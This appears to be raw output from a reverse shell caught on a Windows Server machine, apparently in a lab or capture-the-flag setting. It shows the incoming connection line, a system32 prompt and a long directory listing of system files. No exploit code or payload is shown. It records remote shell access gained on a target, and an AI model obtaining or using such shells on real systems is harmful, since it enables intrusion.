Connection from 10.10.10.27:49739
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>dir
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325
09/15/2018  12:10 AM             6,656 KBDOSM.DLL
09/15/2018  12:10 AM             7,168 KBDPASH.DLL
09/15/2018  12:10 AM             7,168 kbdphags.dll
09/15/2018  12:10 AM             7,680 KBDPL.DLL
09/15/2018  12:10 AM             7,168 KBDPL1.DLL
09/15/2018  12:10 AM             7,680 KBDPO.DLL
09/15/2018  12:10 AM             8,192 KBDRO.DLL
09/15/2018  12:10 AM             8,704 KBDROPR.DLL
09/15/2018  12:10 AM             8,704 KBDROST.DLL
09/15/2018  12:10 AM             6,656 KBDRU.DLL
09/15/2018  12:10 AM             7,168 KBDRU1.DLL
09/15/2018  12:10 AM             8,192 KBDRUM.DLL
09/15/2018  12:10 AM             7,680 KBDSF.DLL
09/15/2018  12:10 AM             7,680 KBDSG.DLL
09/15/2018  12:10 AM             7,680 KBDSL.DLL
09/15/2018  12:10 AM             8,192 KBDSL1.DLL
09/15/2018  12:10 AM             8,704 KBDSMSFI.DLL
09/15/2018  12:10 AM             8,704 KBDSMSNO.DLL
09/15/2018  12:10 AM             6,656 KBDSN1.DLL
09/15/2018  12:10 AM             6,656 KBDSORA.DLL
09/15/2018  12:10 AM             7,680 KBDSOREX.DLL
09/15/2018  12:10 AM             7,680 KBDSORS1.DLL
09/15/2018  12:10 AM             7,680 KBDSORST.DLL
09/15/2018  12:10 AM             7,168 KBDSP.DLL
09/15/2018  12:10 AM             7,168 KBDSW.DLL
09/15/2018  12:10 AM             7,680 KBDSW09.DLL
09/15/2018  12:10 AM             7,168 KBDSYR1.DLL
09/15/2018  12:10 AM             7,168 KBDSYR2.DLL
09/15/2018  12:10 AM             7,168 KBDTAILE.DLL
09/15/2018  12:10 AM             7,168 KBDTAJIK.DLL
09/15/2018  12:10 AM             7,168 KBDTAT.DLL
09/15/2018  12:10 AM             7,168 KBDTH0.DLL
09/15/2018  12:10 AM             7,168 KBDTH1.DLL
09/15/2018  12:10 AM             7,168 KBDTH2.DLL
09/15/2018  12:10 AM             7,168 KBDTH3.DLL
09/15/2018  12:10 AM             7,168 KBDTIFI.DLL
09/15/2018  12:10 AM             7,168 KBDTIFI2.DLL
09/15/2018  12:10 AM             7,680 KBDTIPRC.DLL
09/15/2018  12:10 AM             7,680 KBDTIPRD.DLL
09/15/2018  12:10 AM             7,168 KBDTT102.DLL
09/15/2018  12:10 AM             7,680 KBDTUF.DLL
09/15/2018  12:10 AM             7,680 KBDTUQ.DLL
09/15/2018  12:10 AM             7,168 KBDTURME.DLL
09/15/2018  12:10 AM             7,680 KBDTZM.DLL
09/15/2018  12:10 AM             7,168 KBDUGHR.DLL
09/15/2018  12:10 AM             7,168 KBDUGHR1.DLL
09/15/2018  12:10 AM             6,656 KBDUK.DLL
09/15/2018  12:10 AM             8,192 KBDUKX.DLL
09/15/2018  12:10 AM             6,656 KBDUR.DLL
09/15/2018  12:10 AM             7,168 KBDUR1.DLL
09/15/2018  12:10 AM             6,656 KBDURDU.DLL
09/15/2018  12:10 AM             8,192 KBDUS.DLL
09/15/2018  12:10 AM             7,168 KBDUSA.DLL
09/15/2018  12:10 AM             7,168 KBDUSL.DLL
09/15/2018  12:10 AM             7,168 KBDUSR.DLL
09/15/2018  12:10 AM             7,680 KBDUSX.DLL
09/15/2018  12:10 AM             7,168 KBDUZB.DLL
09/15/2018  12:10 AM             6,656 KBDVNTC.DLL
09/15/2018  12:10 AM             7,168 KBDWOL.DLL
09/15/2018  12:10 AM             7,168 KBDYAK.DLL
09/15/2018  12:10 AM             7,168 KBDYBA.DLL
09/15/2018  12:10 AM             7,168 KBDYCC.DLL
09/15/2018  12:10 AM             8,704 KBDYCL.DLL
09/15/2018  12:09 AM           125,528 KerbClientShared.dll
09/15/2018  12:09 AM           773,120 kerberos.dll
09/15/2018  12:09 AM            51,336 kernel.appcore.dll
09/15/2018  12:09 AM           649,264 kernel32.dll
09/15/2018  12:09 AM         2,072,176 KernelBase.dll
09/15/2018  12:10 AM            39,936 KeyCredMgr.dll
09/15/2018  12:09 AM            66,048 keyiso.dll
09/15/2018  12:09 AM            31,744 klist.exe
09/15/2018  12:09 AM            39,424 kmddsp.tsp
09/15/2018  12:12 AM    <DIR>          ko-KR
09/15/2018  12:09 AM            31,744 ksetup.exe
09/15/2018  12:09 AM            15,360 ktmutil.exe
09/15/2018  12:09 AM            21,504 ktmw32.dll
09/15/2018  12:09 AM            57,344 ktpass.exe
09/15/2018  12:10 AM            52,736 l2nacp.dll
09/15/2018  12:09 AM            15,360 label.exe
09/15/2018  12:09 AM           182,784 LaunchTM.exe
09/15/2018  12:09 AM           211,938 lcphrase.tbl
09/15/2018  12:09 AM            24,114 lcptr.tbl
01/19/2020  11:39 PM            61,532 license.rtf
09/15/2018  12:12 AM    <DIR>          Licenses
09/15/2018  12:09 AM           334,848 LicensingDiagSpp.dll
09/15/2018  12:10 AM            23,552 linkinfo.dll
09/15/2018  12:09 AM           100,864 loadperf.dll
09/15/2018  12:09 AM           806,560 locale.nls
09/15/2018  12:09 AM            43,520 lodctr.exe
09/15/2018  12:12 AM    <DIR>          LogFiles
09/15/2018  12:09 AM            97,280 logman.exe
09/15/2018  12:09 AM            19,968 logoff.exe
09/15/2018  12:09 AM           186,120 logoncli.dll
09/15/2018  12:09 AM             2,560 lpk.dll
09/15/2018  12:09 AM            23,552 lsmproxy.dll
09/15/2018  12:12 AM    <DIR>          lt-LT
09/15/2018  12:10 AM            49,168 luainstall.dll
09/15/2018  12:12 AM    <DIR>          lv-LV
09/15/2018  12:09 AM             2,560 lz32.dll
09/15/2018  12:09 AM             9,926 l_intl.nls
09/15/2018  12:09 AM            68,608 makecab.exe
09/15/2018  12:09 AM            80,896 mcbuilder.exe
09/15/2018  12:09 AM            43,008 mf3216.dll
02/10/2016  10:25 PM         4,424,352 mfc120.dll
02/10/2016  10:25 PM            46,248 mfc120chs.dll
02/10/2016  10:25 PM            46,248 mfc120cht.dll
02/10/2016  10:25 PM            74,920 mfc120deu.dll
02/10/2016  10:25 PM            65,192 mfc120enu.dll
02/10/2016  10:25 PM            73,896 mfc120esn.dll
02/10/2016  10:25 PM            74,920 mfc120fra.dll
02/10/2016  10:25 PM            72,872 mfc120ita.dll
02/10/2016  10:25 PM            53,928 mfc120jpn.dll
02/10/2016  10:25 PM            53,416 mfc120kor.dll
02/10/2016  10:25 PM            70,824 mfc120rus.dll
02/10/2016  10:25 PM         4,449,952 mfc120u.dll
10/10/2017  09:01 PM         4,821,632 mfc140.dll
10/10/2017  09:01 PM            46,736 mfc140chs.dll
10/10/2017  09:01 PM            46,736 mfc140cht.dll
10/10/2017  09:01 PM            75,400 mfc140deu.dll
10/10/2017  09:01 PM            65,680 mfc140enu.dll
10/10/2017  09:01 PM            74,384 mfc140esn.dll
10/10/2017  09:01 PM            75,408 mfc140fra.dll
10/10/2017  09:01 PM            73,360 mfc140ita.dll
10/10/2017  09:01 PM            54,928 mfc140jpn.dll
10/10/2017  09:01 PM            53,904 mfc140kor.dll
10/10/2017  09:01 PM            71,312 mfc140rus.dll
10/10/2017  09:01 PM         5,124,744 mfc140u.dll
09/15/2018  12:09 AM         1,178,624 mfc42.dll
09/15/2018  12:09 AM         1,163,776 mfc42u.dll
02/10/2016  10:25 PM            83,104 mfcm120.dll
02/10/2016  10:25 PM            83,104 mfcm120u.dll
10/10/2017  09:01 PM            92,296 mfcm140.dll
10/10/2017  09:01 PM            92,808 mfcm140u.dll
09/15/2018  12:10 AM            28,672 mfcsubs.dll
09/15/2018  12:09 AM            18,944 mgmtapi.dll
09/15/2018  12:10 AM           102,912 mi.dll
09/15/2018  12:10 AM            73,216 mibincodec.dll
09/15/2018  12:10 AM            14,336 Microsoft.Management.Infrastructure.Native.Unmanaged.dll
09/15/2018  12:09 AM           119,808 migisol.dll
09/15/2018  02:06 AM    <DIR>          migration
09/15/2018  12:12 AM    <DIR>          migwiz
09/15/2018  12:09 AM            33,792 mimefilt.dll
09/15/2018  12:10 AM           119,296 mimofcodec.dll
09/15/2018  12:09 AM            12,288 MinstoreEvents.dll
09/15/2018  12:09 AM           232,448 mintdh.dll
09/15/2018  12:09 AM         2,883,584 mispace.dll
09/15/2018  12:10 AM           192,000 miutils.dll
09/15/2018  12:09 AM           673,088 mlang.dat
09/15/2018  12:09 AM           198,656 mlang.dll
09/15/2018  12:09 AM           366,736 MMDevAPI.dll
09/15/2018  12:09 AM            26,624 mode.com
09/15/2018  12:09 AM            24,576 more.com
09/15/2018  12:09 AM            15,360 mountvol.exe
09/15/2018  12:09 AM            89,552 mpr.dll
09/15/2018  12:09 AM           445,952 mprapi.dll
09/15/2018  12:09 AM           404,480 mprdim.dll
09/15/2018  12:09 AM            12,288 mprext.dll
09/15/2018  12:09 AM           113,152 mprmsg.dll
09/15/2018  12:09 AM            14,336 MRINFO.EXE
09/15/2018  12:09 AM           864,624 MrmCoreR.dll
09/15/2018  12:09 AM             2,560 msafd.dll
09/15/2018  12:09 AM            50,608 msasn1.dll
09/15/2018  12:09 AM           155,136 msaudite.dll
09/15/2018  12:09 AM           235,520 mscandui.dll
09/15/2018  12:09 AM            11,776 mscat32.dll
09/15/2018  12:11 AM           207,872 msclmd.dll
09/15/2018  12:09 AM           606,208 mscms.dll
09/15/2018  12:09 AM           315,904 mscoree.dll
09/15/2018  12:09 AM            19,968 mscorier.dll
09/15/2018  12:09 AM            81,544 mscories.dll
09/15/2018  12:09 AM             2,560 mscpx32r.dLL
09/15/2018  12:09 AM            14,848 mscpxl32.dLL
09/15/2018  12:09 AM         1,296,552 msctf.dll
09/15/2018  12:09 AM             8,704 msctfime.ime
09/15/2018  12:09 AM            70,144 MsCtfMonitor.dll
09/15/2018  12:09 AM            91,136 msctfp.dll
09/15/2018  12:09 AM            87,040 msctfui.dll
09/15/2018  12:09 AM         1,804,288 msctfuimanager.dll
09/15/2018  12:09 AM           121,856 msdart.dll
09/15/2018  12:09 AM             5,120 msdatsrc.tlb
09/15/2018  12:09 AM           401,720 msdelta.dll
09/15/2018  12:12 AM    <DIR>          MSDRM
09/15/2018  12:10 AM           439,296 msdrm.dll
09/15/2018  12:12 AM    <DIR>          Msdtc
09/15/2018  12:09 AM           726,016 msdtcprx.dll
09/15/2018  12:09 AM            12,288 msdtcspoffln.dll
09/15/2018  12:09 AM           265,216 msdtcuiu.dll
09/15/2018  12:09 AM            22,528 msdtcVSp1res.dll
09/15/2018  12:09 AM         2,770,944 msftedit.dll
09/15/2018  12:09 AM            22,528 msg.exe
09/15/2018  12:10 AM         3,918,848 msi.dll
09/15/2018  12:10 AM            78,336 msiexec.exe
09/15/2018  12:10 AM           323,584 msihnd.dll
09/15/2018  12:10 AM            17,408 msiltcfg.dll
09/15/2018  12:09 AM             6,656 msimg32.dll
09/15/2018  12:10 AM            26,112 msimsg.dll
09/15/2018  12:09 AM            38,400 msimtf.dll
09/15/2018  12:09 AM           335,360 msinfo32.exe
09/15/2018  12:10 AM            24,064 msisip.dll
09/15/2018  12:09 AM           260,096 msIso.dll
09/15/2018  12:09 AM         1,311,744 msjet40.dll
09/15/2018  12:09 AM             8,704 msjint40.dll
09/15/2018  12:09 AM            83,968 msjter40.dll
09/15/2018  12:09 AM           290,816 msjtes40.dll
09/15/2018  12:09 AM            49,152 mskeyprotect.dll
09/15/2018  12:09 AM           184,320 msls31.dll
09/15/2018  12:09 AM            63,488 msobjs.dll
08/22/2017  07:38 PM            96,440 msodbcdiag13.dll
08/22/2017  07:38 PM         1,962,168 msodbcsql13.dll
09/15/2018  12:09 AM             2,560 msorc32r.dll
09/15/2018  12:09 AM           160,256 msorcl32.dll
09/15/2018  12:09 AM            44,560 mspatcha.dll
09/15/2018  12:09 AM            64,000 mspatchc.dll
09/15/2018  12:09 AM           101,376 msscript.ocx
09/15/2018  12:09 AM            59,904 mssign32.dll
09/15/2018  12:10 AM           221,696 mstask.dll
09/15/2018  12:09 AM           413,696 msutb.dll
09/15/2018  12:09 AM           387,600 msv1_0.dll
09/15/2018  12:09 AM            64,512 msvcirt.dll
02/20/2011  12:03 AM           421,200 msvcp100.dll
09/15/2018  12:09 AM           414,968 msvcp110_win.dll
02/10/2016  10:25 PM           455,488 msvcp120.dll
09/15/2018  12:10 AM           485,576 msvcp120_clr0400.dll
10/10/2017  09:01 PM           457,000 msvcp140.dll
09/15/2018  12:09 AM           446,976 msvcp60.dll
09/15/2018  12:09 AM           516,496 msvcp_win.dll
02/19/2011  01:40 AM           773,968 msvcr100.dll
09/15/2018  12:10 AM            19,080 msvcr100_clr0400.dll
02/10/2016  10:25 PM           971,584 msvcr120.dll
09/15/2018  12:10 AM           987,840 msvcr120_clr0400.dll
09/15/2018  12:09 AM           779,376 msvcrt.dll
09/15/2018  12:09 AM            60,928 msvcrt40.dll
09/15/2018  12:09 AM           866,816 mswdat10.dll
09/15/2018  12:09 AM           324,616 mswsock.dll
09/15/2018  12:09 AM           640,512 mswstr10.dll
10/29/2018  03:37 PM         1,495,552 msxml3.dll
09/15/2018  12:09 AM             2,560 msxml3r.dll
10/29/2018  03:37 PM         2,020,560 msxml6.dll
09/15/2018  12:10 AM             2,560 msxml6r.dll
09/15/2018  12:09 AM           202,768 MTF.dll
09/15/2018  12:09 AM           369,152 mtxclu.dll
09/15/2018  12:10 AM            26,624 mtxdm.dll
09/15/2018  12:10 AM             8,192 mtxex.dll
09/15/2018  12:10 AM            31,232 mtxlegih.dll
09/15/2018  12:09 AM           116,224 mtxoci.dll
09/15/2018  12:12 AM    <DIR>          MUI
09/15/2018  12:09 AM            14,848 muifontsetup.dll
09/15/2018  12:10 AM            83,968 MuiUnattend.exe
09/15/2018  12:09 AM            54,784 NapiNSP.dll
09/15/2018  12:12 AM    <DIR>          nb-NO
09/15/2018  12:09 AM            19,968 NcaApi.dll
09/15/2018  12:10 AM            33,280 nci.dll
09/15/2018  12:10 AM            55,808 ncobjapi.dll
09/15/2018  12:09 AM           127,592 ncrypt.dll
09/15/2018  12:09 AM           281,600 ncryptprov.dll
09/15/2018  12:09 AM           115,880 ncryptsslp.dll
09/15/2018  12:10 AM            65,536 ndadmin.exe
09/15/2018  12:12 AM    <DIR>          NDF
09/15/2018  12:09 AM           245,248 ndfapi.dll
09/15/2018  12:09 AM            34,816 ndfetw.dll
09/15/2018  12:09 AM               565 NdfEventView.xml
09/15/2018  12:09 AM            81,920 ndfhcdiscovery.dll
09/15/2018  12:09 AM            77,312 ndishc.dll
09/15/2018  12:09 AM            21,504 ndproxystub.dll
09/15/2018  12:09 AM           100,864 negoexts.dll
09/15/2018  12:09 AM            47,104 net.exe
09/15/2018  12:09 AM           140,800 net1.exe
09/15/2018  12:09 AM            68,680 netapi32.dll
09/15/2018  12:09 AM            15,360 netbios.dll
09/15/2018  12:09 AM            22,016 netbtugc.exe
09/15/2018  12:10 AM            58,880 NetCfgNotifyObjectHost.exe
09/15/2018  12:09 AM            76,600 netcfgx.dll
09/15/2018  12:09 AM           236,544 netdiagfx.dll
09/15/2018  12:09 AM            73,216 netdom.exe
09/15/2018  12:09 AM            81,408 NetDriverInstall.dll
09/15/2018  12:09 AM            20,480 netevent.dll
09/15/2018  12:09 AM            90,624 netfxperf.dll
09/15/2018  12:09 AM             2,560 neth.dll
09/15/2018  12:09 AM           155,648 netiohlp.dll
09/15/2018  12:09 AM            25,088 netiougc.exe
09/15/2018  12:09 AM           140,288 netjoin.dll
09/15/2018  12:09 AM           659,968 netlogon.dll
09/15/2018  12:09 AM             2,560 netmsg.dll
09/15/2018  12:10 AM           178,176 netprofm.dll
09/15/2018  12:09 AM            52,736 netprovfw.dll
09/15/2018  12:09 AM            56,832 netprovisionsp.dll
09/15/2018  12:09 AM           108,048 NetSetupApi.dll
09/15/2018  12:09 AM           595,256 NetSetupEngine.dll
09/15/2018  12:10 AM           370,688 NetSetupShim.dll
09/15/2018  12:09 AM            82,432 netsh.exe
09/15/2018  12:09 AM            32,768 NETSTAT.EXE
09/15/2018  12:09 AM            37,160 netutils.dll
09/15/2018  12:09 AM         1,182,208 networkexplorer.dll
09/15/2018  12:09 AM            43,008 networkitemfactory.dll
09/15/2018  12:12 AM    <DIR>          networklist
09/15/2018  12:10 AM           486,912 newdev.dll
09/15/2018  12:10 AM            67,584 newdev.exe
09/15/2018  12:10 AM            53,760 ngclocal.dll
09/15/2018  12:09 AM           322,560 ninput.dll
09/15/2018  12:12 AM    <DIR>          nl-NL
09/15/2018  12:09 AM            70,144 nlaapi.dll
09/15/2018  12:09 AM           152,576 nlhtml.dll
09/15/2018  12:10 AM            18,432 nlmproxy.dll
09/15/2018  12:10 AM            14,336 nlmsprep.dll
09/15/2018  12:10 AM            89,600 nlsbres.dll
09/14/2018  10:34 AM         5,489,664 NlsData0009.dll
09/15/2018  12:10 AM             8,704 Nlsdl.dll
09/15/2018  12:09 AM           423,936 nltest.exe
09/15/2018  12:10 AM             5,120 normaliz.dll
09/15/2018  12:09 AM           240,128 notepad.exe
09/15/2018  12:10 AM            21,504 npmproxy.dll
09/15/2018  12:09 AM            35,840 nshhttp.dll
09/15/2018  12:09 AM           332,800 nshipsec.dll
09/15/2018  12:09 AM           607,744 nshwfp.dll
09/15/2018  12:09 AM            20,144 nsi.dll
09/15/2018  12:09 AM            77,824 nslookup.exe
09/15/2018  12:09 AM           177,312 ntasn1.dll
09/15/2018  12:09 AM         1,674,480 ntdll.dll
09/15/2018  12:09 AM            97,792 ntdsapi.dll
09/15/2018  12:09 AM            57,344 ntlanman.dll
09/15/2018  12:09 AM            33,056 NtlmShared.dll
09/15/2018  12:09 AM           153,408 ntmarta.dll
09/15/2018  12:09 AM           317,440 ntprint.dll
09/15/2018  12:09 AM            61,952 ntprint.exe
09/15/2018  12:10 AM           671,232 ntshrui.dll
09/15/2018  12:09 AM            16,384 ntvdm64.dll
09/15/2018  12:09 AM           556,544 objsel.dll
09/15/2018  12:09 AM           165,888 ocsetapi.dll
09/15/2018  12:09 AM           605,184 odbc32.dll
09/15/2018  12:09 AM            72,192 odbcad32.exe
09/15/2018  12:09 AM            39,936 odbcbcp.dll
09/15/2018  12:09 AM            24,064 odbcconf.dll
09/15/2018  12:09 AM            22,016 odbcconf.exe
09/15/2018  12:09 AM             4,453 odbcconf.rsp
09/15/2018  12:09 AM           110,592 odbccp32.dll
09/15/2018  12:09 AM            69,632 odbccr32.dll
09/15/2018  12:09 AM            70,656 odbccu32.dll
09/15/2018  12:09 AM           225,280 odbcint.dll
09/15/2018  12:09 AM            10,240 odbcji32.dll
09/15/2018  12:09 AM           318,464 odbcjt32.dll
09/15/2018  12:09 AM           128,000 odbctrac.dll
09/15/2018  12:09 AM             8,704 oddbse32.dll
09/15/2018  12:09 AM             8,704 odexl32.dll
09/15/2018  12:09 AM             8,704 odfox32.dll
09/15/2018  12:09 AM             8,704 odpdx32.dll
09/15/2018  12:09 AM             8,704 odtext32.dll
09/15/2018  12:09 AM           220,672 offfilt.dll
09/15/2018  12:09 AM           116,024 offlinelsa.dll
09/15/2018  12:09 AM           222,008 offlinesam.dll
09/15/2018  12:10 AM         1,026,440 ole32.dll
09/15/2018  12:09 AM           324,608 oleacc.dll
09/15/2018  12:09 AM            10,240 oleacchooks.dll
09/15/2018  12:09 AM             4,608 oleaccrc.dll
09/15/2018  12:09 AM           628,248 oleaut32.dll
09/15/2018  12:09 AM            88,064 olepro32.dll
09/15/2018  12:09 AM            52,224 OnDemandConnRouteHelper.dll
09/15/2018  12:10 AM           210,944 OneCoreCommonProxyStub.dll
09/15/2018  12:09 AM         3,652,664 OneCoreUAPCommonProxyStub.dll
09/15/2018  12:12 AM    <DIR>          oobe
09/15/2018  12:09 AM         1,607,168 OpcServices.dll
09/15/2018  12:11 AM            23,552 opencl.dll
09/15/2018  12:09 AM            60,416 openfiles.exe
09/15/2018  12:10 AM           100,872 OpenWith.exe
09/15/2018  12:10 AM            21,504 osbaseln.dll
09/15/2018  12:09 AM             8,192 osuninst.dll
09/15/2018  12:09 AM            16,896 PATHPING.EXE
09/15/2018  12:10 AM            53,760 pautoenr.dll
09/15/2018  12:10 AM           707,072 PayloadRestrictions.dll
09/15/2018  12:09 AM           659,008 PCPKsp.dll
09/15/2018  12:09 AM            26,032 pcwum.dll
09/15/2018  12:09 AM           260,608 pdh.dll
09/15/2018  12:10 AM           345,600 PeerDistSh.dll
08/22/2017  11:17 PM            51,896 perf-MSSQL14.MSSQLSERVER-sqlagtctr.dll
08/22/2017  11:16 PM           111,288 perf-MSSQLSERVER-sqlctr14.0.1000.169.dll
09/15/2018  12:09 AM            41,472 perfctrs.dll
09/15/2018  12:09 AM            37,376 perfdisk.dll
09/15/2018  12:09 AM            21,504 perfhost.exe
09/15/2018  12:09 AM            22,016 perfnet.dll
09/15/2018  12:09 AM            35,328 perfos.dll
09/15/2018  12:09 AM            36,352 perfproc.dll
09/15/2018  12:09 AM           888,336 pidgenx.dll
09/15/2018  12:09 AM            18,944 PING.EXE
09/15/2018  12:09 AM           204,288 PkgMgr.exe
09/15/2018  12:09 AM           196,096 pku2u.dll
09/15/2018  12:12 AM    <DIR>          pl-PL
09/15/2018  12:10 AM         1,534,464 pla.dll
09/15/2018  12:09 AM           296,960 polstore.dll
09/14/2018  11:09 PM           117,248 poqexec.exe
09/15/2018  12:09 AM            80,896 powercfg.exe
09/15/2018  12:09 AM           341,560 powrprof.dll
09/15/2018  12:10 AM           248,832 PresentationHost.exe
09/15/2018  12:10 AM            48,640 PresentationHostProxy.dll
09/15/2018  12:09 AM            13,824 prflbmsg.dll
09/15/2018  12:09 AM            14,848 print.exe
09/15/2018  12:09 AM           106,384 profapi.dll
09/15/2018  12:10 AM           133,632 profext.dll
09/15/2018  12:09 AM         1,571,880 propsys.dll
09/15/2018  12:09 AM           238,592 provthrd.dll
09/15/2018  12:10 AM            63,488 prvdmofcomp.dll
09/15/2018  12:09 AM            17,208 psapi.dll
09/15/2018  12:09 AM            60,432 PSHED.DLL
09/15/2018  12:10 AM            38,912 PSModuleDiscoveryProvider.dll
09/15/2018  12:09 AM            14,336 pstorec.dll
09/15/2018  12:12 AM    <DIR>          pt-BR
09/15/2018  12:12 AM    <DIR>          pt-PT
09/15/2018  12:10 AM            70,656 pwrshplugin.dll
09/15/2018  12:09 AM            20,992 qappsrv.exe
09/15/2018  12:09 AM            23,552 qprocess.exe
09/15/2018  12:09 AM            80,896 Query.dll
09/15/2018  12:09 AM            14,336 query.exe
09/15/2018  12:09 AM            20,992 quser.exe
09/15/2018  12:09 AM            25,088 qwinsta.exe
09/15/2018  12:10 AM            91,648 radardt.dll
09/15/2018  12:12 AM    <DIR>          ras
09/15/2018  12:09 AM             1,820 rasctrnm.h
09/15/2018  12:09 AM            64,000 rasdiag.dll
09/15/2018  12:09 AM           156,672 rasman.dll
09/15/2018  12:10 AM           284,160 rasppp.dll
09/15/2018  12:09 AM           241,664 rastapi.dll
09/15/2018  12:09 AM           316,928 rdpinit.exe
09/15/2018  12:09 AM            38,400 RdpSa.exe
09/15/2018  12:09 AM            24,064 RdpSaProxy.exe
09/15/2018  12:09 AM            11,776 RdpSaPs.dll
09/15/2018  12:09 AM            26,112 RdpSaUacHelper.exe
09/15/2018  12:09 AM           387,584 rdpshell.exe
09/15/2018  12:09 AM            74,240 rdpsign.exe
09/15/2018  12:09 AM            41,984 rdrleakdiag.exe
09/15/2018  12:09 AM           186,368 rdvgocl32.dll
09/15/2018  12:09 AM           684,544 rdvgogl32.dll
09/15/2018  12:09 AM           146,432 rdvgu1132.dll
09/15/2018  12:09 AM            96,256 rdvgumd32.dll
09/15/2018  12:09 AM            65,536 rdvvmtransport.dll
09/15/2018  12:10 AM           916,792 ReAgent.dll
09/15/2018  12:10 AM            35,328 ReAgentc.exe
09/15/2018  12:09 AM            12,288 recover.exe
09/15/2018  12:12 AM    <DIR>          Recovery
09/15/2018  12:09 AM            59,392 reg.exe
09/15/2018  12:09 AM            82,944 regapi.dll
09/15/2018  12:10 AM           329,216 regedit.exe
09/15/2018  12:10 AM            10,240 regedt32.exe
09/15/2018  12:10 AM            20,480 Register-CimProvider.exe
09/15/2018  12:09 AM            20,992 regsvr32.exe
09/15/2018  12:10 AM           152,064 ReInfo.dll
09/15/2018  12:09 AM            45,568 relog.exe
09/15/2018  12:09 AM            18,944 replace.exe
09/15/2018  12:09 AM            14,848 reset.exe
09/15/2018  12:09 AM               714 RestartManager.mof
09/15/2018  12:09 AM               176 RestartManagerUninstall.mof
09/15/2018  12:09 AM           481,792 resutils.dll
09/15/2018  12:09 AM            32,768 rfxvmt.dll
09/15/2018  12:09 AM           496,640 riched20.dll
09/15/2018  12:09 AM             8,192 riched32.dll
09/15/2018  12:10 AM           540,672 RMActivate.exe
09/15/2018  12:10 AM           557,568 RMActivate_isv.exe
09/15/2018  12:10 AM           479,232 RMActivate_ssp.exe
09/15/2018  12:10 AM           479,744 RMActivate_ssp_isv.exe
09/15/2018  12:09 AM            15,360 RmClient.exe
09/15/2018  12:12 AM    <DIR>          ro-RO
09/15/2018  12:09 AM           103,936 Robocopy.exe
09/15/2018  12:09 AM            19,456 ROUTE.EXE
09/15/2018  12:09 AM           151,552 rpchttp.dll
09/15/2018  12:09 AM             8,704 RpcNs4.dll
09/15/2018  12:09 AM            27,648 rpcnsh.dll
09/15/2018  12:09 AM           782,968 rpcrt4.dll
09/15/2018  12:09 AM            51,640 RpcRtRemote.dll
09/15/2018  12:09 AM           185,608 rsaenh.dll
09/15/2018  12:09 AM            43,566 rsop.msc
09/15/2018  12:10 AM            80,896 rsopprov.exe
09/15/2018  12:09 AM           198,656 RstrtMgr.dll
09/15/2018  12:09 AM            36,864 rtffilt.dll
09/15/2018  12:09 AM           162,304 rtm.dll
09/15/2018  12:09 AM            52,224 rtutils.dll
09/15/2018  12:09 AM           155,664 RTWorkQ.dll
09/15/2018  12:12 AM    <DIR>          ru-RU
09/15/2018  12:09 AM            17,920 runas.exe
09/15/2018  12:09 AM            61,952 rundll32.exe
09/15/2018  12:09 AM            47,104 runonce.exe
09/15/2018  12:09 AM            19,456 rwinsta.exe
09/15/2018  12:09 AM            70,144 samcli.dll
09/15/2018  12:09 AM            84,480 samlib.dll
09/15/2018  12:09 AM            60,928 sc.exe
09/15/2018  12:10 AM            67,072 SCardDlg.dll
09/15/2018  12:09 AM           214,016 scecli.dll
09/15/2018  12:10 AM           384,000 scesrv.dll
09/15/2018  12:09 AM           447,488 schannel.dll
09/15/2018  12:09 AM            19,968 schedcli.dll
09/15/2018  12:09 AM           190,976 schtasks.exe
09/15/2018  12:10 AM           236,032 scksp.dll
09/15/2018  12:09 AM            42,148 SCregEdit.wsf
09/15/2018  12:09 AM            28,672 scrnsave.scr
09/15/2018  12:09 AM           207,872 scrobj.dll
09/15/2018  12:09 AM           466,432 scrptadm.dll
09/15/2018  12:09 AM           165,376 scrrun.dll
09/15/2018  12:09 AM            20,992 sdbinst.exe
09/15/2018  12:09 AM           220,672 SDClient.dll
09/15/2018  12:09 AM            37,888 SecEdit.exe
09/15/2018  12:09 AM           492,432 sechost.dll
09/15/2018  12:10 AM           347,648 secproc.dll
09/15/2018  12:10 AM           346,112 secproc_isv.dll
09/15/2018  12:10 AM            88,064 secproc_ssp.dll
09/15/2018  12:10 AM            88,576 secproc_ssp_isv.dll
09/15/2018  12:09 AM            23,040 secur32.dll
09/15/2018  12:09 AM             4,608 security.dll
09/15/2018  12:09 AM            11,264 SensApi.dll
09/15/2018  12:09 AM           409,088 SessEnv.dll
09/15/2018  12:09 AM            24,064 setspn.exe
09/15/2018  02:06 AM    <DIR>          setup
09/15/2018  12:09 AM            26,112 setup16.exe
